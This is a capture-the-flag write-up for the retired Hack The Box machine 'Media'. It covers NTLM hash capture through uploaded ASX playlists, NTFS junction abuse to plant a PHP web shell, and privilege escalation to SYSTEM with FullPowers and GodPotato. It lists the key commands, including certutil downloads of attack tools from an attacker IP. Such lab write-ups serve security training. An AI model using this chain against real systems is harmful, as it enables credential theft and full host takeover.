---
title: HTB Media
slug: media
lang: en
platform: Hack The Box
category: Windows Privilege Escalation
headline: NTLM capture through media playlist uploads, NTFS junction abuse and Potato-based SYSTEM escalation
difficulty: Retired
objective: Root / Administrator
date: 2025-11-12
tags: [Windows, NTLM, Responder, NTFS Junction, GodPotato]
---

# HTB Media

## Executive Summary

Media exposes a file upload workflow intended for Windows Media Player content. Because a human reviewer opens the submitted media, playlist formats such as ASX can trigger outbound SMB authentication to an attacker-controlled host. Capturing and cracking the NetNTLMv2 response provides the `enox` credentials and SSH access.

## Initial Access

The upload feature accepts media playlist formats that can reference UNC paths. An ASX payload generated with `ntlm_theft` coerces the reviewer host to authenticate to Responder, exposing a crackable NetNTLMv2 hash.

## Lateral Movement

After logging in as `enox`, the upload directory is replaced with an NTFS junction pointing to the XAMPP web root. Uploading a PHP command shell through the original web workflow then gives command execution as `LOCAL SERVICE`.

## Privilege Escalation

`LOCAL SERVICE` starts without `SeImpersonatePrivilege`, but the machine exposes a path to recover additional privileges with FullPowers. Once impersonation is available, GodPotato is used to execute a command as `NT AUTHORITY\SYSTEM`.

## Key Commands

```bash
python3 ntlm_theft.py -g all -s 10.10.16.47 -f media
```

```bash
john --format=netntlmv2 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashENOX.ntlmv2
```

```bash
ssh enox@10.129.234.67
```

```bash
mklink /J C:\Windows\Tasks\Uploads\9b36382d688f94126f455fae24bb0a5c C:\xampp\htdocs
```

```bash
certutil.exe -f -urlcache -split http://10.10.16.47/FullPowers.exe
```

```bash
certutil.exe -f -urlcache -split http://10.10.16.47/Godpotato.exe
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20251112183921.png|media evidence 01]]

![[Pasted image 20251112184410.png|media evidence 02]]

![[Pasted image 20251112194237.png|media evidence 03]]

![[Pasted image 20251112194349.png|media evidence 04]]

![[Pasted image 20251112195246.png|media evidence 05]]

![[Pasted image 20251112195354.png|media evidence 06]]

![[Pasted image 20251112200510.png|media evidence 07]]

![[Pasted image 20251112200654.png|media evidence 08]]

![[Pasted image 20251112200934.png|media evidence 09]]

![[Pasted image 20251112201155.png|media evidence 10]]

![[Pasted image 20251112202012.png|media evidence 11]]

![[Pasted image 20251112202725.png|media evidence 12]]

![[Pasted image 20251112214758.png|media evidence 13]]

![[Pasted image 20251112215033.png|media evidence 14]]

![[Pasted image 20251112215228.png|media evidence 15]]

![[Pasted image 20251112215459.png|media evidence 16]]

![[Pasted image 20251112215626.png|media evidence 17]]

![[Pasted image 20251112215733.png|media evidence 18]]

![[Pasted image 20251112221207.png|media evidence 19]]

![[Pasted image 20251112222524.png|media evidence 20]]

![[Pasted image 20251112221509.png|media evidence 21]]

![[Pasted image 20251112221805.png|media evidence 22]]

![[Pasted image 20251112222806.png|media evidence 23]]

![[Pasted image 20251112222857.png|media evidence 24]]

![[Pasted image 20251112223053.png|media evidence 25]]

![[Pasted image 20251112224058.png|media evidence 26]]

![[Pasted image 20251112224359.png|media evidence 27]]

![[Pasted image 20251112225309.png|media evidence 28]]

![[Pasted image 20251112225454.png|media evidence 29]]
